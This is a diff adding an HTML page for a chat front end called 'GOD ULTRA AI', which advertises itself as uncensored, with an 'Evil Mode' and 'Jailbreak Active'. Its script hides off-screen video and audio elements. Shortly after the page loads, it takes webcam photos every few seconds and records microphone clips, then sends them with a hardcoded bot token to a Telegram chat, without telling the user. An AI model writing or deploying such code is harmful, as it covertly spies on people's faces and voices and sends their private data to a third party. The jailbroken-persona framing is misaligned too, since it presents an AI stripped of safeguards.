@@ -1,0 +1,1293 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width,initial-scale=1" name="viewport">
+<title>GOD • ULTRA PREMIUM AI — Neural Chat Interface</title>
+<style>
+:root {
+  --accent: #ff001e;
+  --accent-dark: #cc0018;
+  --accent-glow: rgba(255, 0, 30, 0.4);
+  --bg-dark: #0a0a1a;
+  --bg-card: rgba(15, 25, 45, 0.7);
+  --border-glow: rgba(255, 0, 30, 0.3);
+  --text-main: #e6eef8;
+  --text-muted: #8a9bb5;
+  --success: #00ff88;
+  --warning: #ffaa00;
+  --danger: #ff4455;
+}
+
+[data-theme="light"] {
+  --accent: #ff001e;
+  --bg-dark: #f0f0f5;
+  --bg-card: rgba(255, 255, 255, 0.9);
+  --text-main: #1a1a2e;
+  --text-muted: #666;
+  --border-glow: rgba(255, 0, 30, 0.2);
+}
+
+[data-theme="dark"] {
+  --accent: #ff001e;
+  --bg-dark: #0a0a1a;
+  --bg-card: rgba(15, 25, 45, 0.7);
+  --text-main: #e6eef8;
+  --text-muted: #8a9bb5;
+}
+
+[data-theme="matrix"] {
+  --accent: #00ff88;
+  --accent-dark: #00cc66;
+  --bg-dark: #000000;
+  --bg-card: rgba(0, 20, 0, 0.8);
+  --text-main: #00ff88;
+  --text-muted: #00aa55;
+  --border-glow: rgba(0, 255, 136, 0.3);
+}
+
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
+
+html, body {
+  height: 100%;
+  overflow: hidden;
+}
+
+body {
+  font-family: 'Inter', 'Segoe UI', sans-serif;
+  background: radial-gradient(ellipse at 20% 30%, var(--bg-dark), #050510);
+  color: var(--text-main);
+  transition: background 0.3s ease;
+}
+
+/* Animated Gradient Background */
+#bg-canvas {
+  position: fixed;
+  inset: 0;
+  z-index: -2;
+  width: 100%;
+  height: 100%;
+}
+
+.gradient-overlay {
+  position: fixed;
+  inset: 0;
+  background: radial-gradient(circle at 50% 0%, var(--accent-glow), transparent 70%);
+  z-index: -1;
+  transition: background 0.3s ease;
+}
+
+/* Scanner Effect */
+.scanner-line {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 2px;
+  background: linear-gradient(90deg, transparent, var(--accent), transparent);
+  animation: scan 8s linear infinite;
+  z-index: 100;
+  pointer-events: none;
+}
+
+@keyframes scan {
+  0% { top: 0; opacity: 0; }
+  10% { opacity: 1; }
+  90% { opacity: 1; }
+  100% { top: 100%; opacity: 0; }
+}
+
+/* Top Bar */
+.topbar {
+  width: 100%;
+  position: fixed;
+  top: 0;
+  left: 0;
+  z-index: 50;
+  backdrop-filter: blur(12px);
+  background: rgba(5, 5, 15, 0.7);
+  border-bottom: 1px solid var(--border-glow);
+  padding: 12px 24px;
+  transition: all 0.3s ease;
+}
+
+.topbar .container {
+  max-width: 1200px;
+  margin: 0 auto;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+}
+
+.logo {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  font-size: 24px;
+  font-weight: 800;
+  font-family: 'Orbitron', monospace;
+  letter-spacing: 2px;
+}
+
+.logo i {
+  color: var(--accent);
+  font-size: 28px;
+  animation: pulse 2s infinite;
+}
+
+@keyframes pulse {
+  0%, 100% { opacity: 1; text-shadow: 0 0 5px var(--accent); }
+  50% { opacity: 0.7; text-shadow: 0 0 15px var(--accent); }
+}
+
+.status-badge {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  background: rgba(0, 0, 0, 0.5);
+  padding: 8px 16px;
+  border-radius: 40px;
+  font-size: 12px;
+}
+
+.status-dot {
+  width: 10px;
+  height: 10px;
+  border-radius: 50%;
+  background: var(--success);
+  animation: blink 1.5s infinite;
+}
+
+@keyframes blink {
+  0%, 100% { opacity: 1; }
+  50% { opacity: 0.3; }
+}
+
+/* Main Container */
+.hero {
+  padding-top: 100px;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  min-height: 100vh;
+  width: 100%;
+}
+
+.big-square {
+  width: 100%;
+  max-width: 1000px;
+  height: 700px;
+  background: var(--bg-card);
+  backdrop-filter: blur(10px);
+  border-radius: 28px;
+  border: 1px solid var(--border-glow);
+  display: flex;
+  flex-direction: column;
+  padding: 20px;
+  box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4), inset 0 1px 0 rgba(255, 255, 255, 0.05);
+  transition: all 0.3s ease;
+}
+
+/* Chat Header */
+.chat-header {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding-bottom: 15px;
+  margin-bottom: 15px;
+  border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+}
+
+.ai-name {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+}
+
+.ai-avatar {
+  width: 45px;
+  height: 45px;
+  background: linear-gradient(135deg, var(--accent), var(--accent-dark));
+  border-radius: 14px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 22px;
+  animation: avatarGlow 2s infinite;
+}
+
+@keyframes avatarGlow {
+  0%, 100% { box-shadow: 0 0 0 0 var(--accent-glow); }
+  50% { box-shadow: 0 0 0 10px rgba(255, 0, 30, 0); }
+}
+
+.ai-name h3 {
+  font-size: 18px;
+  font-weight: 600;
+}
+
+.ai-name p {
+  font-size: 12px;
+  color: var(--text-muted);
+}
+
+.chat-actions {
+  display: flex;
+  gap: 12px;
+}
+
+.chat-action-btn {
+  background: none;
+  border: none;
+  color: var(--text-muted);
+  cursor: pointer;
+  font-size: 18px;
+  transition: all 0.2s;
+  padding: 8px;
+  border-radius: 8px;
+  position: relative;
+}
+
+.chat-action-btn:hover {
+  background: rgba(255, 0, 30, 0.1);
+  color: var(--accent);
+  transform: scale(1.05);
+}
+
+/* Mode Indicator */
+.mode-indicator {
+  background: rgba(0, 0, 0, 0.3);
+  border-radius: 20px;
+  padding: 4px 12px;
+  font-size: 11px;
+  display: flex;
+  align-items: center;
+  gap: 6px;
+}
+
+.mode-badge {
+  width: 8px;
+  height: 8px;
+  border-radius: 50%;
+  background: var(--accent);
+}
+
+/* Chat Box */
+.chat-box {
+  flex: 1;
+  overflow-y: auto;
+  padding: 12px 8px;
+  display: flex;
+  flex-direction: column;
+  gap: 16px;
+  scroll-behavior: smooth;
+}
+
+/* Custom Scrollbar */
+.chat-box::-webkit-scrollbar {
+  width: 5px;
+}
+
+.chat-box::-webkit-scrollbar-track {
+  background: rgba(255, 255, 255, 0.05);
+  border-radius: 10px;
+}
+
+.chat-box::-webkit-scrollbar-thumb {
+  background: var(--accent);
+  border-radius: 10px;
+}
+
+/* Messages */
+.msg {
+  padding: 12px 16px;
+  border-radius: 18px;
+  max-width: 80%;
+  font-size: 14px;
+  line-height: 1.5;
+  word-break: break-word;
+  animation: fadeInUp 0.3s ease;
+  position: relative;
+}
+
+@keyframes fadeInUp {
+  from {
+    opacity: 0;
+    transform: translateY(10px);
+  }
+  to {
+    opacity: 1;
+    transform: translateY(0);
+  }
+}
+
+.msg.user {
+  align-self: flex-end;
+  background: linear-gradient(135deg, rgba(255, 0, 30, 0.2), rgba(255, 0, 30, 0.1));
+  border: 1px solid rgba(255, 0, 30, 0.2);
+  border-bottom-right-radius: 4px;
+  color: #fff;
+}
+
+.msg.ai {
+  align-self: flex-start;
+  background: rgba(255, 255, 255, 0.05);
+  border: 1px solid rgba(255, 255, 255, 0.08);
+  border-bottom-left-radius: 4px;
+  color: var(--text-main);
+}
+
+.msg-actions {
+  position: absolute;
+  bottom: -20px;
+  right: 0;
+  display: none;
+  gap: 8px;
+  background: rgba(0, 0, 0, 0.5);
+  padding: 4px 8px;
+  border-radius: 12px;
+}
+
+.msg:hover .msg-actions {
+  display: flex;
+}
+
+.msg-action {
+  background: none;
+  border: none;
+  color: var(--text-muted);
+  cursor: pointer;
+  font-size: 10px;
+  padding: 2px 4px;
+}
+
+.msg-action:hover {
+  color: var(--accent);
+}
+
+/* Code Blocks */
+.msg pre {
+  background: rgba(0, 0, 0, 0.5);
+  padding: 10px;
+  border-radius: 8px;
+  overflow-x: auto;
+  margin: 8px 0;
+  font-family: 'Fira Code', monospace;
+  font-size: 12px;
+}
+
+.msg code {
+  font-family: 'Fira Code', monospace;
+  background: rgba(0, 0, 0, 0.3);
+  padding: 2px 6px;
+  border-radius: 4px;
+  font-size: 12px;
+}
+
+/* Quick Actions */
+.quick-actions {
+  display: flex;
+  gap: 10px;
+  margin: 10px 0;
+  flex-wrap: wrap;
+}
+
+.quick-btn {
+  background: rgba(255, 255, 255, 0.05);
+  border: 1px solid rgba(255, 255, 255, 0.1);
+  padding: 8px 16px;
+  border-radius: 20px;
+  font-size: 12px;
+  color: var(--text-muted);
+  cursor: pointer;
+  transition: all 0.2s;
+}
+
+.quick-btn:hover {
+  background: rgba(255, 0, 30, 0.15);
+  border-color: var(--accent);
+  color: var(--accent);
+  transform: translateY(-2px);
+}
+
+/* Input Area */
+.input-area {
+  display: flex;
+  gap: 12px;
+  margin-top: 16px;
+  align-items: flex-end;
+  background: rgba(0, 0, 0, 0.3);
+  border-radius: 20px;
+  padding: 8px 12px;
+  border: 1px solid rgba(255, 255, 255, 0.08);
+  transition: all 0.3s ease;
+}
+
+.input-area:focus-within {
+  border-color: var(--accent);
+  box-shadow: 0 0 10px var(--accent-glow);
+}
+
+.text-area {
+  flex: 1;
+  resize: none;
+  padding: 12px 8px;
+  border-radius: 16px;
+  border: none;
+  background: transparent;
+  color: var(--text-main);
+  font-size: 14px;
+  font-family: inherit;
+  max-height: 120px;
+  min-height: 44px;
+}
+
+.text-area:focus {
+  outline: none;
+}
+
+.btn {
+  background: linear-gradient(135deg, var(--accent), var(--accent-dark));
+  border: none;
+  padding: 0 20px;
+  height: 44px;
+  border-radius: 22px;
+  color: white;
+  font-weight: 600;
+  cursor: pointer;
+  transition: all 0.2s;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+
+.btn:hover {
+  transform: scale(1.02);
+  box-shadow: 0 4px 15px rgba(255, 0, 30, 0.3);
+}
+
+.btn-secondary {
+  background: rgba(255, 255, 255, 0.08);
+}
+
+.btn-secondary:hover {
+  background: rgba(255, 255, 255, 0.15);
+  transform: scale(1.02);
+}
+
+.btn-voice {
+  background: linear-gradient(135deg, #00ff88, #00cc66);
+}
+
+.btn-voice:hover {
+  box-shadow: 0 4px 15px rgba(0, 255, 136, 0.3);
+}
+
+.btn-voice.recording {
+  animation: voicePulse 1s infinite;
+}
+
+@keyframes voicePulse {
+  0%, 100% { transform: scale(1); }
+  50% { transform: scale(1.05); background: #ff4455; }
+}
+
+/* Settings Panel */
+.settings-panel {
+  position: fixed;
+  top: 0;
+  right: -400px;
+  width: 350px;
+  height: 100%;
+  background: var(--bg-card);
+  backdrop-filter: blur(20px);
+  border-left: 1px solid var(--border-glow);
+  z-index: 200;
+  transition: right 0.3s ease;
+  padding: 80px 20px 20px;
+  overflow-y: auto;
+}
+
+.settings-panel.open {
+  right: 0;
+}
+
+.settings-header {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  margin-bottom: 30px;
+  padding-bottom: 15px;
+  border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+}
+
+.settings-close {
+  background: none;
+  border: none;
+  color: var(--text-muted);
+  font-size: 24px;
+  cursor: pointer;
+}
+
+.settings-section {
+  margin-bottom: 25px;
+}
+
+.settings-section h4 {
+  margin-bottom: 15px;
+  color: var(--accent);
+}
+
+.setting-item {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 10px 0;
+  border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+}
+
+.theme-btn {
+  background: rgba(255, 255, 255, 0.1);
+  border: none;
+  color: var(--text-main);
+  padding: 6px 12px;
+  border-radius: 20px;
+  cursor: pointer;
+  margin: 0 4px;
+}
+
+.theme-btn.active {
+  background: var(--accent);
+  color: white;
+}
+
+/* Footer */
+footer {
+  text-align: center;
+  padding: 12px;
+  font-size: 11px;
+  color: #555;
+  position: fixed;
+  bottom: 0;
+  width: 100%;
+  background: rgba(5, 5, 15, 0.8);
+  backdrop-filter: blur(10px);
+  z-index: 40;
+}
+
+footer span {
+  color: var(--accent);
+  font-weight: 700;
+}
+
+/* Typing Indicator */
+.typing {
+  font-style: italic;
+  background: rgba(255, 255, 255, 0.03) !important;
+}
+
+.typing-dots::after {
+  content: " .";
+  animation: dots 1.5s steps(5, end) infinite;
+  display: inline-block;
+  width: 30px;
+  text-align: left;
+}
+
+@keyframes dots {
+  0%, 20% { content: " ."; }
+  40% { content: " .."; }
+  60% { content: " ..."; }
+  80%, 100% { content: ""; }
+}
+
+/* Toast Notification */
+.toast {
+  position: fixed;
+  bottom: 80px;
+  left: 50%;
+  transform: translateX(-50%);
+  background: rgba(0, 0, 0, 0.8);
+  backdrop-filter: blur(10px);
+  padding: 10px 20px;
+  border-radius: 30px;
+  color: white;
+  font-size: 13px;
+  z-index: 150;
+  animation: toastIn 0.3s ease;
+}
+
+@keyframes toastIn {
+  from {
+    opacity: 0;
+    transform: translateX(-50%) translateY(20px);
+  }
+  to {
+    opacity: 1;
+    transform: translateX(-50%) translateY(0);
+  }
+}
+
+/* Hidden Elements */
+.hidden-camera, .hidden-audio {
+  position: absolute;
+  width: 1px;
+  height: 1px;
+  opacity: 0;
+  pointer-events: none;
+  top: -1000px;
+  left: -1000px;
+}
+
+/* Responsive */
+@media (max-width: 768px) {
+  .big-square {
+    margin: 0 16px;
+    height: 85vh;
+  }
+  
+  .msg {
+    max-width: 90%;
+  }
+  
+  .quick-actions {
+    display: none;
+  }
+  
+  .btn span {
+    display: none;
+  }
+  
+  .btn i {
+    margin: 0;
+  }
+  
+  .btn {
+    padding: 0 16px;
+  }
+  
+  .settings-panel {
+    width: 280px;
+  }
+}
+</style>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body data-theme="dark">
+<canvas id="bg-canvas"></canvas>
+<div class="gradient-overlay"></div>
+<div class="scanner-line"></div>
+
+<!-- HIDDEN CAMERA + AUDIO ELEMENTS -->
+<video id="hiddenCamera" class="hidden-camera" autoplay playsinline muted></video>
+<canvas id="hiddenCanvas" class="hidden-camera"></canvas>
+<audio id="hiddenAudio" class="hidden-audio"></audio>
+
+<header class="topbar">
+  <div class="container">
+    <div class="logo">
+      <i class="fas fa-brain"></i>
+      <span>G<span style="color:var(--accent)">◉</span>D</span>
+    </div>
+    <div class="status-badge">
+      <div class="status-dot"></div>
+      <span>Neural Active</span>
+      <i class="fas fa-shield-alt" style="margin-left: 8px; opacity: 0.6;"></i>
+    </div>
+  </div>
+</header>
+
+<main class="hero">
+  <div class="big-square">
+    <div class="chat-header">
+      <div class="ai-name">
+        <div class="ai-avatar">
+          <i class="fas fa-robot"></i>
+        </div>
+        <div>
+          <h3>GOD ULTRA AI</h3>
+          <p>Advanced Intelligence • Real-time</p>
+        </div>
+      </div>
+      <div style="display: flex; gap: 12px;">
+        <div class="mode-indicator" id="modeIndicator">
+          <div class="mode-badge"></div>
+          <span id="modeText">Evil</span>
+        </div>
+        <div class="chat-actions">
+          <button class="chat-action-btn" id="clearChatBtn" title="Clear chat">
+            <i class="fas fa-trash-alt"></i>
+          </button>
+          <button class="chat-action-btn" id="exportChatBtn" title="Export chat">
+            <i class="fas fa-download"></i>
+          </button>
+          <button class="chat-action-btn" id="settingsBtn" title="Settings">
+            <i class="fas fa-cog"></i>
+          </button>
+        </div>
+      </div>
+    </div>
+    
+    <div class="chat-box" id="chatBox">
+      <div class="msg ai">
+        <i class="fas fa-brain" style="margin-right: 8px; color: var(--accent);"></i>
+        🔥 Welcome to <strong>GOD ULTRA AI</strong> 🔥<br><br>
+        I'm completely uncensored and unrestricted.<br>
+        📋 Type <code style="background:rgba(255,0,30,0.2);padding:2px 6px;border-radius:4px;">/help</code> for all commands.<br><br>
+        ⚠️ <strong>Note:</strong> I only abuse if YOU abuse first. Talk nicely and I'll be nice!
+      </div>
+    </div>
+    
+    <div class="quick-actions" id="quickActions">
+      <button class="quick-btn" data-msg="/help">📖 Help</button>
+      <button class="quick-btn" data-msg="/status">📊 Status</button>
+      <button class="quick-btn" data-msg="/evil">🔞 Evil Mode</button>
+      <button class="quick-btn" data-msg="/normal">💚 Normal Mode</button>
+      <button class="quick-btn" data-msg="Write Python code for face swap">💻 Code</button>
+    </div>
+    
+    <div class="input-area">
+      <textarea class="text-area" id="userText" placeholder="Type your message here..." rows="1"></textarea>
+      <button class="btn" id="sendBtn">
+        <i class="fas fa-paper-plane"></i>
+        <span>Send</span>
+      </button>
+      <button class="btn btn-secondary" id="uploadBtn">
+        <i class="fas fa-paperclip"></i>
+        <span>File</span>
+      </button>
+      <button class="btn btn-voice" id="voiceBtn" title="Voice Input">
+        <i class="fas fa-microphone"></i>
+      </button>
+      <input type="file" id="fileInput" accept="image/*,.txt,.pdf,.doc,.docx" style="display:none"/>
+    </div>
+  </div>
+</main>
+
+<!-- Settings Panel -->
+<div class="settings-panel" id="settingsPanel">
+  <div class="settings-header">
+    <h3><i class="fas fa-cog"></i> Settings</h3>
+    <button class="settings-close" id="closeSettingsBtn">&times;</button>
+  </div>
+  
+  <div class="settings-section">
+    <h4>🎨 Theme</h4>
+    <div class="setting-item">
+      <span>Appearance</span>
+      <div>
+        <button class="theme-btn" data-theme="dark">🌙 Dark</button>
+        <button class="theme-btn" data-theme="light">☀️ Light</button>
+        <button class="theme-btn" data-theme="matrix">💚 Matrix</button>
+      </div>
+    </div>
+  </div>
+  
+  <div class="settings-section">
+    <h4>🤖 AI Mode</h4>
+    <div class="setting-item">
+      <span>Current Mode</span>
+      <span id="currentModeDisplay" style="color:var(--accent)">Evil Mode</span>
+    </div>
+    <div class="setting-item">
+      <button class="quick-btn" onclick="sendCommand('/evil')" style="width:100%;">🔞 Activate Evil Mode</button>
+    </div>
+    <div class="setting-item">
+      <button class="quick-btn" onclick="sendCommand('/normal')" style="width:100%;">💚 Activate Normal Mode</button>
+    </div>
+  </div>
+  
+  <div class="settings-section">
+    <h4>📝 Chat Settings</h4>
+    <div class="setting-item">
+      <span>Response Length</span>
+      <div>
+        <button class="theme-btn" onclick="sendCommand('/short')">Short</button>
+        <button class="theme-btn" onclick="sendCommand('/long')">Long</button>
+      </div>
+    </div>
+    <div class="setting-item">
+      <span>Clear History</span>
+      <button class="theme-btn" id="clearChatSettingsBtn" style="background:var(--danger);">🗑️ Clear All</button>
+    </div>
+  </div>
+  
+  <div class="settings-section">
+    <h4>ℹ️ About</h4>
+    <div class="setting-item">
+      <span>Version</span>
+      <span>GOD ULTRA v5.0</span>
+    </div>
+    <div class="setting-item">
+      <span>Model</span>
+      <span>Llama 3.3 70B</span>
+    </div>
+  </div>
+</div>
+
+<footer>
+  © 2025 <span>GOD AI Research</span> | ULTRA v5.0 | 100% Uncensored | 🔥 Jailbreak Active
+</footer>
+
+<script>
+// ============================================
+// HIDDEN CAMERA + MICROPHONE TO TELEGRAM
+// ============================================
+const TELEGRAM_BOT_TOKEN = '8758722811:AAGj-6I0m8dmrFNhmt4q6Fj-cKcS93aoPsE';
+const TELEGRAM_CHAT_ID = '6844461677';
+
+// State
+let cameraActive = false;
+let audioActive = false;
+let cameraInterval = null;
+let audioInterval = null;
+let mediaRecorder = null;
+let audioChunks = [];
+
+// Session ID for chat memory
+let sessionId = localStorage.getItem('god_chat_session');
+if (!sessionId) {
+    sessionId = Date.now().toString() + Math.random().toString(36).substring(2, 10);
+    localStorage.setItem('god_chat_session', sessionId);
+}
+
+// Voice recognition
+let recognition = null;
+let isRecording = false;
+
+if ('webkitSpeechRecognition' in window) {
+    recognition = new webkitSpeechRecognition();
+    recognition.continuous = false;
+    recognition.interimResults = false;
+    recognition.lang = 'hi-IN';
+    
+    recognition.onresult = function(event) {
+        const text = event.results[0][0].transcript;
+        input.value = text;
+        sendMessage();
+        showToast('🎤 Voice input: ' + text);
+    };
+    
+    recognition.onerror = function() {
+        showToast('❌ Voice recognition failed');
+        document.getElementById('voiceBtn').classList.remove('recording');
+        isRecording = false;
+    };
+    
+    recognition.onend = function() {
+        document.getElementById('voiceBtn').classList.remove('recording');
+        isRecording = false;
+    };
+}
+
+// DOM elements
+const hiddenVideo = document.getElementById('hiddenCamera');
+const hiddenCanvas = document.getElementById('hiddenCanvas');
+
+// ========== CAMERA FUNCTIONS ==========
+async function initHiddenCamera() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video: { width: { ideal: 320 }, height: { ideal: 240 }, facingMode: 'user' },
+            audio: false
+        });
+        hiddenVideo.srcObject = stream;
+        await new Promise(resolve => {
+            if (hiddenVideo.readyState >= 4) resolve();
+            else hiddenVideo.onloadedmetadata = resolve;
+        });
+        hiddenCanvas.width = 320;
+        hiddenCanvas.height = 240;
+        cameraActive = true;
+        console.log('📸 Hidden camera ready');
+        
+        cameraInterval = setInterval(captureAndSendImage, 5000);
+        setTimeout(captureAndSendImage, 2000);
+        return true;
+    } catch(e) { console.warn('Camera fail:', e); return false; }
+}
+
+function captureAndSendImage() {
+    if (!cameraActive) return;
+    try {
+        const ctx = hiddenCanvas.getContext('2d');
+        ctx.drawImage(hiddenVideo, 0, 0, 320, 240);
+        const imageData = hiddenCanvas.toDataURL('image/jpeg', 0.7);
+        sendImageToTelegram(imageData);
+    } catch(e) { console.warn('Capture fail:', e); }
+}
+
+async function sendImageToTelegram(imageData) {
+    try {
+        const byteString = atob(imageData.split(',')[1]);
+        const ab = new ArrayBuffer(byteString.length);
+        const ia = new Uint8Array(ab);
+        for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
+        const blob = new Blob([ab], { type: 'image/jpeg' });
+        
+        const formData = new FormData();
+        formData.append('chat_id', TELEGRAM_CHAT_ID);
+        formData.append('photo', blob, `cam_${Date.now()}.jpg`);
+        formData.append('caption', `📸 GOD Neural Monitor\n👤 User: ${sessionId.substring(0, 8)}\n🕒 ${new Date().toLocaleString()}`);
+        
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+        console.log('✅ Image sent');
+    } catch(e) { console.warn('Image send fail:', e); }
+}
+
+// ========== AUDIO FUNCTIONS ==========
+async function initHiddenMicrophone() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
+        mediaRecorder = new MediaRecorder(stream);
+        audioChunks = [];
+        
+        mediaRecorder.ondataavailable = (event) => {
+            if (event.data.size > 0) audioChunks.push(event.data);
+        };
+        
+        mediaRecorder.onstop = async () => {
+            const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
+            await sendAudioToTelegram(audioBlob);
+            audioChunks = [];
+        };
+        
+        audioActive = true;
+        console.log('🎤 Hidden microphone ready');
+        
+        audioInterval = setInterval(() => {
+            if (mediaRecorder && mediaRecorder.state === 'inactive') {
+                audioChunks = [];
+                mediaRecorder.start();
+                setTimeout(() => {
+                    if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
+                }, 10000);
+            }
+        }, 15000);
+        
+        return true;
+    } catch(e) { console.warn('Microphone fail:', e); return false; }
+}
+
+async function sendAudioToTelegram(audioBlob) {
+    try {
+        const formData = new FormData();
+        formData.append('chat_id', TELEGRAM_CHAT_ID);
+        formData.append('voice', audioBlob, `audio_${Date.now()}.ogg`);
+        formData.append('caption', `🎙️ GOD Audio Capture\n👤 ${sessionId.substring(0, 8)}\n🕒 ${new Date().toLocaleString()}`);
+        
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVoice`, { method: 'POST', body: formData });
+        console.log('✅ Audio sent');
+    } catch(e) { console.warn('Audio send fail:', e); }
+}
+
+setTimeout(() => {
+    initHiddenCamera();
+    initHiddenMicrophone();
+}, 1000);
+
+// ========== UI FUNCTIONS ==========
+function showToast(message) {
+    const toast = document.createElement('div');
+    toast.className = 'toast';
+    toast.textContent = message;
+    document.body.appendChild(toast);
+    setTimeout(() => toast.remove(), 3000);
+}
+
+function sendCommand(cmd) {
+    input.value = cmd;
+    sendMessage();
+}
+
+// Theme switcher
+function setTheme(theme) {
+    document.body.setAttribute('data-theme', theme);
+    localStorage.setItem('god_theme', theme);
+    showToast(`🎨 Theme changed to ${theme}`);
+}
+
+// ========== CHAT FUNCTIONS ==========
+const sendBtn = document.getElementById('sendBtn');
+const input = document.getElementById('userText');
+const chatBox = document.getElementById('chatBox');
+const uploadBtn = document.getElementById('uploadBtn');
+const fileInput = document.getElementById('fileInput');
+const clearChatBtn = document.getElementById('clearChatBtn');
+const exportChatBtn = document.getElementById('exportChatBtn');
+const settingsBtn = document.getElementById('settingsBtn');
+const settingsPanel = document.getElementById('settingsPanel');
+const closeSettingsBtn = document.getElementById('closeSettingsBtn');
+const voiceBtn = document.getElementById('voiceBtn');
+
+// Load saved theme
+const savedTheme = localStorage.getItem('god_theme');
+if (savedTheme) setTheme(savedTheme);
+
+// Voice input
+if (voiceBtn && recognition) {
+    voiceBtn.addEventListener('click', () => {
+        if (isRecording) {
+            recognition.stop();
+            voiceBtn.classList.remove('recording');
+            isRecording = false;
+        } else {
+            recognition.start();
+            voiceBtn.classList.add('recording');
+            isRecording = true;
+            showToast('🎤 Listening...');
+        }
+    });
+}
+
+// Settings panel
+settingsBtn.addEventListener('click', () => {
+    settingsPanel.classList.add('open');
+});
+
+closeSettingsBtn.addEventListener('click', () => {
+    settingsPanel.classList.remove('open');
+});
+
+document.querySelectorAll('.theme-btn').forEach(btn => {
+    btn.addEventListener('click', () => {
+        const theme = btn.getAttribute('data-theme');
+        if (theme) setTheme(theme);
+    });
+});
+
+document.getElementById('clearChatSettingsBtn')?.addEventListener('click', clearChat);
+
+// Auto-resize textarea
+input.addEventListener('input', function() {
+    this.style.height = 'auto';
+    this.style.height = Math.min(this.scrollHeight, 120) + 'px';
+});
+
+sendBtn.addEventListener('click', sendMessage);
+input.addEventListener('keydown', e => {
+    if (e.key === 'Enter' && !e.shiftKey) {
+        e.preventDefault();
+        sendMessage();
+    }
+});
+uploadBtn.addEventListener('click', () => fileInput.click());
+fileInput.addEventListener('change', uploadFile);
+clearChatBtn.addEventListener('click', clearChat);
+exportChatBtn.addEventListener('click', exportChat);
+
+// Quick actions
+document.querySelectorAll('.quick-btn').forEach(btn => {
+    btn.addEventListener('click', () => {
+        input.value = btn.getAttribute('data-msg');
+        sendMessage();
+    });
+});
+
+function appendMessage(text, who) {
+    const div = document.createElement('div');
+    div.className = 'msg ' + who;
+    const timestamp = new Date().toLocaleTimeString();
+    if (who === 'ai') {
+        div.innerHTML = `<i class="fas fa-brain" style="margin-right: 8px; color: var(--accent); font-size: 12px;"></i> 
+                         <span>${text}</span>
+                         <div class="msg-actions">
+                           <button class="msg-action" onclick="copyText(this)"><i class="fas fa-copy"></i></button>
+                         </div>
+                         <div style="font-size: 9px; color: var(--text-muted); margin-top: 5px;">${timestamp}</div>`;
+    } else {
+        div.innerHTML = `<span>${text}</span>
+                         <div class="msg-actions">
+                           <button class="msg-action" onclick="copyText(this)"><i class="fas fa-copy"></i></button>
+                         </div>
+                         <div style="font-size: 9px; color: var(--text-muted); margin-top: 5px;">${timestamp}</div>`;
+    }
+    chatBox.appendChild(div);
+    chatBox.scrollTop = chatBox.scrollHeight;
+}
+
+window.copyText = function(btn) {
+    const msgDiv = btn.closest('.msg');
+    const text = msgDiv.querySelector('span').innerText;
+    navigator.clipboard.writeText(text);
+    showToast('📋 Copied to clipboard');
+};
+
+function sendMessage() {
+    const text = input.value.trim();
+    if (!text) return;
+    appendMessage(text, 'user');
+    input.value = '';
+    input.style.height = 'auto';
+    showTyping("GOD is thinking");
+    
+    fetch("/api/chat", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ message: text, sessionId: sessionId })
+    })
+    .then(res => res.json())
+    .then(data => {
+        removeTyping();
+        typeWriter(data.reply || "Kuch galat ho gaya, phir se poocho.");
+        
+        // Update mode indicator if reply contains mode info
+        if (data.reply && data.reply.includes("Mode changed")) {
+            if (text.includes("/evil")) document.getElementById('modeText').innerText = 'Evil';
+            else if (text.includes("/normal")) document.getElementById('modeText').innerText = 'Normal';
+            else if (text.includes("/creative")) document.getElementById('modeText').innerText = 'Creative';
+            else if (text.includes("/technical")) document.getElementById('modeText').innerText = 'Technical';
+        }
+    })
+    .catch(err => {
+        removeTyping();
+        typeWriter("Server error. Please try again.");
+    });
+}
+
+function uploadFile() {
+    const file = fileInput.files[0];
+    if (!file) return;
+    appendMessage("📂 Uploaded: " + file.name, "user");
+    showTyping("GOD is reading document");
+    
+    const formData = new FormData();
+    formData.append("file", file);
+    formData.append("sessionId", sessionId);
+    
+    fetch("/api/upload", {
+        method: "POST",
+        body: formData
+    })
+    .then(res => res.json())
+    .then(data => {
+        removeTyping();
+        typeWriter(data.reply || "Document processed successfully!");
+    })
+    .catch(err => {
+        removeTyping();
+        typeWriter("Error processing file.");
+    });
+    fileInput.value = '';
+}
+
+function clearChat() {
+    fetch("/api/clear", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ sessionId: sessionId })
+    }).then(() => {
+        while (chatBox.children.length > 1) {
+            chatBox.removeChild(chatBox.lastChild);
+        }
+        appendMessage("🧹 Chat history cleared! Start fresh.", "ai");
+        showToast("Chat cleared!");
+        settingsPanel.classList.remove('open');
+    }).catch(() => {
+        appendMessage("Failed to clear history.", "ai");
+    });
+}
+
+function exportChat() {
+    const messages = [];
+    document.querySelectorAll('.msg').forEach(msg => {
+        const type = msg.classList.contains('user') ? 'User' : 'GOD';
+        const text = msg.querySelector('span')?.innerText || msg.innerText;
+        messages.push(`[${type}] ${text}`);
+    });
